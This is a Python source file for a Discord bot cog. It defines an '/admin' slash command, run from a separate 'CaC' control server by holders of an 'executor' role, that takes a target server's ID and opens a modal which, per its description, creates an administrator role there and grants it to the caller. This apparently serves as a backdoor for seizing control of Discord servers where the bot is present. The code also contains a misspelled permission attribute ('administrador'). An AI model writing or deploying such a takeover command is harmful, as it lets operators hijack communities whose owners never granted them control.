import nextcord
from nextcord import Interaction, SlashOption
from nextcord.ext import commands, application_checks

from utils.server_utils import ServerUtils
from config.config_handler import ConfigHandler
from components.modals.admin_modal import AdminModal
from middlewares.server_verification import ServerVerification
from errors.custom_exceptions.command_execution import MemberIsNotInGuild

class Admin(commands.Cog):
    
    config_handler = ConfigHandler()
    verifications = ServerVerification()
    utils = ServerUtils()
    
    def __init__(self, bot: commands.Bot):
        self.bot = bot
        
    @nextcord.slash_command(
        name = "admin",
        description = "Crea un rol con admin y te lo da.",
        guild_ids = config_handler.get_CaC_server_id()
    )
    
    @application_checks.has_role(config_handler.get_executor_rol_id())
    async def admin_command(self, ctx: Interaction, 
                    id: str = SlashOption(required = True, description = "Id del servidor objtivo.")):
        
        guild = self.utils.get_server(int(id), self.bot)
        member = guild.get_member(ctx.user.id)
        
        self.verifications.check_command_execution_in_allowed_server(guild.id)
        
        if member is None:
            raise MemberIsNotInGuild
        
        if (not guild.me.guild_permissions.manage_roles
            and not guild.me.guild_permissions.administrador):
            
            raise commands.BotMissingPermissions(["268435456"])
        
        modal = AdminModal(guild, member)
        await ctx.response.send_modal(modal)
        
def setup(client):
    client.add_cog(Admin(client))